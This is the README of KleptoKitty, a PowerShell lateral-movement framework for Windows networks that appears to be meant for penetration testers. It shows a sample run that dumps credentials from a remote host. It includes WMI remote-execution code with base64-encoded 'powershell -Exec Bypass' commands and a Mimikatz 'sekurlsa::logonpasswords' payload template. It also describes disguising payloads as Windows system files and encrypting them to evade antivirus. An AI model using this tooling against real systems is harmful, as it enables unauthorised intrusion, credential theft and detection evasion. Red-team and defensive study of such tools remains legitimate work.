# KleptoKitty

KleptoKitty - Deploys payloads and collects credentials.

## Introduction

KleptoKitty, the twin sister of HardeningKitty is a PowerShell based framework for lateral movement attacks in a Windows infrastructure. The development started in October 2019 after inspiration of the cypherpunk and hacker [Tinker](https://twitter.com/TinkerSec). Payloads include Invoke-Mimikatz from [Empire](https://github.com/BC-SECURITY/Empire) by [BC Security](https://www.bc-security.org/blog), [Mimikatz](https://github.com/gentilkiwi/mimikatz) by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) by [Red Cursor](https://www.redcursor.com.au/).

Standard Windows components are used for file transfer and remote command execution. Most functions are controlled by PowerShell. By default, files are copied to the target system via SMB/Admin shares. For remote execution of commands, Windows Management Instrumentation (WMI), PsExec or Windows Remote Management (WinRM)can be used. The goal is to get local credentials (SAM) and credentials of active accounts in Windows LSA memory.

There is a [scip Labs article about KleptoKitty](https://www.scip.ch/en/?labs.20200917). This README is largely based on the Labs article, but will be adapted in the future according to development of KleptoKitty.

## How to run

Download KleptoKitty and copy it to the target system. The payloads have to be built by yourself. If unencrypted payloads are used, there is a risk that scripts such as Invoke-Mimikatz could be detected by anti-virus software. KleptoKitty does not need administrative privileges to run. But for running KleptoKitty on the target system administrative rights are required. The credentials are requested at the beginning of the script.

```powershell
PS C:\> Import-Module -Force .\Invoke-KleptoKitty.ps1
PS C:\> Invoke-KleptoKitty -ComputerName 192.168.244.130 -CredentialAccess SqlDumper

      =^._.^=
     _(      )/  KleptoKitty


[*] 8/7/2020 8:45:29 AM - Starting KleptoKitty

cmdlet Get-Credential at command pipeline position 1
Supply values for the following parameters:
Credential
[*] 8/7/2020 8:45:42 AM - Connecting to 192.168.244.130 and mapping system drive
[*] 8/7/2020 8:45:42 AM - Copy payload MsSpellCheckingFacility.ps1 to 192.168.244.130
[*] 8/7/2020 8:45:42 AM - Execute payload on 192.168.244.130
[$] 8/7/2020 8:45:42 AM - Payload  executed.
[-] 8/7/2020 8:45:42 AM - Let SqlDumper finish. Waiting for 30 seconds!
[*] 8/7/2020 8:46:12 AM - Retrieving dump file
[$] 8/7/2020 8:46:14 AM - Dump file 192.168.244.130_sqldumper.mdmp saved.
[*] 8/7/2020 8:46:14 AM - Delete payload and dump file on 192.168.244.130
[*] 8/7/2020 8:46:14 AM - Delete drive
[*] 8/7/2020 8:46:14 AM - 192.168.244.130 done
[*] 8/7/2020 8:46:14 AM - KleptoKitty is done
```

## "Hello" World with KleptoKitty

The payload _Demo_ is a good example to explain the functionality of KleptoKitty. The payload is copied to the target and executed there. The payload leaves a log entry in the newly created file under _C:\Windows\kleptokitty.log_:

```powershell
$ProtocolPath = "C:\Windows\kleptokitty.log"
$Time = Get-Date -Format G
$Message = "$Time - KleptoKitty was here."
Add-Content -Path $ProtocolPath -Value $Message
```

For the payload _Demo_, only a file needs to be copied and executed on target. It is not necessary to extract a log file. The name of the payload is generated randomly at runtime for each target system. It is intended to give a harmless impression by using names of Windows system files. In the first step, the payload is copied. If this fails, further execution will be stopped. The payload is then executed and afterwards deleted from the system:

```powershell
# Copy Payload
Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"
$ResultCopyPayload = Copy-Payload -Source $PayloadPathCredentialAccess -Destination $TargetPayloadPath
If (-not($ResultCopyPayload)) { Continue }

# Execute Payload
Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"
$PayloadCommandCredentialAccess = "$TargetPayloadLocalPath"
$ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
If ($ResultExecutePayload) {
    Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
}

# House Cleaning
Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
Delete-File -File $TargetPayloadPath
```

The remote command execution is done using WMI. A new process is created and powershell.exe is started. Optionally, the arguments of the payload can be encoded with Base64 and thus disguised. However, if PowerShell Script Block Logging is enabled, the execution call is stored decoded in the event log. Additionally, the use of Base64 encoding might be an indicator for a malicious action. The use of this obfuscation is optional and can be controlled when the function is called.

```powershell
Code $PayloadCommandEncoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PayloadCommand))
$ArgumentList = "powershell.exe -Exec Bypass -Enc $PayloadCommandEncoded"

try {
    $WmiExec = Invoke-WmiMethod -Class "win32_process" -Name "create" -ArgumentList $ArgumentList -ComputerName $Hostname -Credential $AdminCredential -ErrorAction Stop
} catch {
    $ErrorReason = $_.Exception.Message
    Write-ProtocolEntry -Text "WMI connection to $Hostname failed. Reason: $ErrorReason" -LogLevel "Error"
    Write-ProtocolEntry -Text "$Hostname done" -LogLevel "Error"
    $ReturnCode = $false 
}
```

Once the payload has been started on the target system, the process can only be monitored indirectly. Therefore, if a log file is written and should be copied back, it is worth waiting a while before taking further steps.

## Structure of a Payload

The following example is based on a payload with Invoke-Mimikatz. The Invoke-Mimikatz function itself is copied to the payload. This is followed by the definition of a log file for the Mimikatz log file. The name of the log file must be known to KleptoKitty, otherwise the log file cannot be extracted. Then the Mimikatz statements to be executed are defined. In the following example the credentials of active users on the system are dumped from memory:

```powershell
Function FormerlyKnownAsMimikatz {
    # <add the script here>
}

# Log
$TargetBasePath = "Windows"
$TargetLogName = "de-ch.log"
$TargetLogLocalPath = "C:\$TargetBasePath\$TargetLogName"

# Run Payload
FormerlyKnownAsMimikatz -Command """log $TargetLogLocalPath"" privilege::debug sekurlsa::logonpasswords"
```

The payload itself can also be encoded with Base64 or encrypted with Rijndael. For the encryption, a script based on an [example implementation by Kae Travis](https://www.alkanesolutions.co.uk/2015/05/20/rijndael-encryption-and-decryption-in-c-and-powershell/) is used. The encoding or encryption disguises the payload, so that it can escape detection by a virus scanner. However, the decoding/decryption process is done at runtime. Virus scanners with support for Microsoft AMSI can therefore scan the unprotected version of the payload.